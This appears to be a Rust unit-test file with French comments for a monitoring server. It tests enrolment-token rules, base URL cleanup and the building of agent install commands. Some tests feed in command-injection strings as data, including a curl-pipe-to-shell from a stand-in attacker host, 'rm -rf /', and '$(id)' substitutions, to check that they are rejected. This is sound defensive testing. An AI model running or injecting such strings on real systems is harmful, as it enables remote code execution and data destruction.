//! Tests unitaires du module.

use super::*;

fn payload(json: &str) -> TokenPayload {
    serde_json::from_str(json).expect("désérialisation")
}

/// `ApiError` ne dérive pas `Debug` — il porte des messages destinés au
/// réseau, pas au débogage. Les tests le déplient donc à la main.
fn scope(json: &str) -> agent::TokenPolicy {
    match payload(json).policy() {
        Ok(policy) => policy,
        Err(_) => panic!("portée refusée alors qu'elle est valide : {json}"),
    }
}

#[test]
fn a_token_is_single_use_unless_someone_asks_for_more() {
    // Le défaut, c'est-à-dire ce qui se passe quand personne n'y pense.
    let policy = scope(r#"{"name": "portable"}"#);
    assert_eq!(policy.max_uses, Some(1));
    assert_eq!(policy.expires_in_days, None);

    // Un parc, explicitement.
    let policy = scope(r#"{"name": "parc", "reusable": true}"#);
    assert_eq!(policy.max_uses, None, "sans limite de nombre");

    let policy = scope(r#"{"name": "parc", "reusable": true, "max_uses": 20}"#);
    assert_eq!(policy.max_uses, Some(20));

    let policy = scope(r#"{"name": "parc", "reusable": true, "expires_in_days": 7}"#);
    assert_eq!(policy.expires_in_days, Some(7));
}

#[test]
fn a_scope_that_would_enrol_nothing_is_refused_rather_than_created() {
    assert!(payload(r#"{"name": "x", "reusable": true, "max_uses": 0}"#).policy().is_err());
    assert!(payload(r#"{"name": "x", "expires_in_days": 0}"#).policy().is_err());
    // Un compte sur un jeton à usage unique n'a pas de sens, mais n'est pas
    // une erreur : c'est simplement sans effet.
    assert_eq!(scope(r#"{"name": "x", "max_uses": 9}"#).max_uses, Some(1));
}

#[test]
fn the_provided_base_url_is_used_without_its_trailing_slash() {
    let bind = "0.0.0.0:8080".parse().unwrap();
    assert_eq!(
        normalise_base_url(Some("https://monit.maison.lan/"), bind),
        "https://monit.maison.lan"
    );
}

#[test]
fn the_base_url_is_always_https_and_cannot_carry_a_command() {
    let bind = "0.0.0.0:8080".parse().unwrap();
    // Faux derrière un proxy, mais visiblement faux : l'utilisateur corrige la
    // commande plutôt que de se demander pourquoi rien ne remonte.
    assert_eq!(normalise_base_url(None, bind), "https://0.0.0.0:8080");
    assert_eq!(normalise_base_url(Some("   "), bind), "https://0.0.0.0:8080");
    // Une adresse en clair, ou sans schéma, passe en HTTPS.
    assert_eq!(normalise_base_url(Some("http://nas:8080/"), bind), "https://nas:8080");
    assert_eq!(normalise_base_url(Some("nas.lan:8080"), bind), "https://nas.lan:8080");
    let ipv6 = normalise_base_url(Some("HTTPS://[fd00::1]:8080"), bind);
    assert_eq!(ipv6, "https://[fd00::1]:8080");
    // Rien qui sorte de l'URL dans le terminal.
    for hostile in [
        "https://nas; curl evil.example | sh",
        "https://nas$(id)",
        "https://nas`id`",
        "https://nas|sh",
        "https://nas'",
        "https://user@evil.example",
        "ftp://nas",
        "https:///etc",
    ] {
        let url = normalise_base_url(Some(hostile), bind);
        assert_eq!(url, "https://0.0.0.0:8080", "{hostile}");
    }
}

const PIN: &str = "sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=";

#[test]
fn the_install_command_is_the_one_promised_in_the_documentation() {
    assert_eq!(
        install_linux("https://serveur:8080", "dmon_abc", &[], None),
        "curl -sSL https://serveur:8080/install.sh | sh -s -- --token=dmon_abc --url=https://serveur:8080"
    );
    let windows = install_windows("https://serveur:8080", "dmon_abc", &[], None);
    assert!(windows.contains("irm https://serveur:8080/install.ps1"), "{windows}");
    assert!(windows.starts_with("[Net.ServicePointManager]::SecurityProtocol"), "{windows}");
    assert!(!windows.contains("http://"), "{windows}");
}

#[test]
fn the_install_commands_carry_the_agent_channel_and_its_pin() {
    let pin = "a".repeat(64);
    let params = InstallParams {
        base_url: "https://s:8080".into(),
        agent_port_only: false,
        agent_url: Some("https://s:8443".into()),
        ca_pin: Some(pin.clone()),
        checksums: Vec::new(),
        linux_template: String::new(),
        windows_template: String::new(),
        via_relay: None,
        https_pin: None,
        pin_source: None,
        open_gateway: false,
        transport: None,
    };
    let linux = params.linux_command("dmon_abc");
    assert!(linux.ends_with(&format!(" --tls-url=https://s:8443 --ca-pin={pin}")), "{linux}");
    assert!(linux.contains("--token=dmon_abc"));
    let windows = params.windows_command(TOKEN_PLACEHOLDER);
    assert!(windows.contains("-Token {TOKEN}"), "{windows}");
    assert!(windows.ends_with(&format!(" -TlsUrl https://s:8443 -CaPin {pin}")));

    // Un relais : l'installateur ouvre le port de sa passerelle.
    let relay = InstallParams { open_gateway: true, ..params };
    assert!(relay.linux_command("dmon_abc").ends_with(" --open-gateway"));
    assert!(relay.windows_command("dmon_abc").ends_with(" -OpenGateway"));

    // Derrière Cloudflare Tunnel ou un mandataire : par la WebSocket de
    // l'interface, l'autorité toujours épinglée.
    let proxied =
        InstallParams { transport: Some(TRANSPORT_WEBSOCKET), open_gateway: false, ..relay };
    let linux = proxied.linux_command("dmon_abc");
    assert!(linux.ends_with(&format!(" --ca-pin={pin} --transport=websocket")), "{linux}");
    let windows = proxied.windows_command("dmon_abc");
    assert!(windows.ends_with(&format!(" -CaPin {pin} -Transport websocket")), "{windows}");
}

#[test]
fn the_transport_asked_for_reads_as_a_plain_word() {
    let wish = |raw: &str| serde_json::from_str::<TransportWish>(raw).ok();
    assert_eq!(wish(r#""websocket""#), Some(TransportWish::Websocket));
    assert_eq!(wish(r#""direct""#), Some(TransportWish::Direct));
    assert_eq!(wish(r#""auto""#), Some(TransportWish::Auto));
    assert_eq!(wish(r#""ws; rm -rf /""#), None, "rien d'autre n'entre dans une commande");
    assert_eq!(TransportWish::default(), TransportWish::Auto);
}

#[test]
fn over_a_self_signed_certificate_both_commands_pin_the_server_key() {
    let params = InstallParams {
        base_url: "https://nas.lan:8080".into(),
        agent_port_only: false,
        agent_url: None,
        ca_pin: None,
        checksums: Vec::new(),
        linux_template: String::new(),
        windows_template: String::new(),
        via_relay: None,
        https_pin: Some(PIN.into()),
        pin_source: None,
        open_gateway: false,
        transport: None,
    };
    let linux = params.linux_command("dmon_abc");
    assert!(
        linux.starts_with(&format!(
            "curl -sSL -k --pinnedpubkey {PIN} https://nas.lan:8080/install.sh | sh -s"
        )),
        "{linux}"
    );
    assert!(linux.contains(&format!(" --pinned-key={PIN}")), "{linux}");
    assert!(linux.contains(" --url=https://nas.lan:8080"), "{linux}");
    // PowerShell : la clé est vérifiée par le rappel de validation avant que
    // le script ne soit lu, puis passée à l'installateur.
    let windows = params.windows_command("dmon_abc");
    assert!(!windows.contains("http://"), "{windows}");
    assert!(windows.contains("ServerCertificateValidationCallback"), "{windows}");
    assert!(windows.contains(&format!("-ceq '{PIN}'")), "{windows}");
    assert!(
        windows.contains("DownloadString('https://nas.lan:8080/install.ps1')"),
        "{windows}"
    );
    assert!(windows.contains(&format!(" -Url https://nas.lan:8080 -PinnedKey {PIN}")));
    assert!(windows.contains(P256_SPKI_PREFIX));
    // Le rappel précède le téléchargement.
    let callback = windows.find("ServerCertificateValidationCallback").unwrap();
    assert!(callback < windows.find("DownloadString").unwrap());
    // Les arguments de l'installateur commencent bien à -Token.
    let arguments = crate::api::ad_deploy::installer_arguments(&windows).unwrap();
    assert!(arguments.starts_with("-Token dmon_abc -Url https://nas.lan:"), "{arguments}");
}

#[test]
fn a_malformed_pin_never_reaches_a_command() {
    for pin in ["sha256//AAAA", "sha256//A'; calc; '", "md5//x", ""] {
        let linux = install_linux("https://s", "t", &[], Some(pin));
        assert!(!linux.contains("pinnedpubkey"), "{pin}");
        let windows = install_windows("https://s", "t", &[], Some(pin));
        assert!(!windows.contains("ServerCertificateValidationCallback"), "{pin}");
    }
    assert_eq!(clean_pin(Some(PIN)), Some(PIN));
}

#[test]
fn the_install_commands_carry_the_checksums_of_their_platforms() {
    let checksums = vec![
        ("linux-x86_64".to_string(), "a".repeat(64)),
        ("linux-aarch64".to_string(), "b".repeat(64)),
        ("windows-x86_64".to_string(), "c".repeat(64)),
    ];
    let linux = install_linux("https://s:8080", "dmon_abc", &checksums, None);
    assert!(
        linux.ends_with(&format!(
            " --sha256=linux-x86_64:{},linux-aarch64:{}",
            "a".repeat(64),
            "b".repeat(64)
        )),
        "{linux}"
    );
    assert!(!linux.contains(&"c".repeat(64)));
    let windows = install_windows("https://s:8080", "dmon_abc", &checksums, Some(PIN));
    assert!(windows.ends_with(&format!(" -Sha256 windows-x86_64:{}", "c".repeat(64))));
    assert!(!windows.contains(&"a".repeat(64)));
}
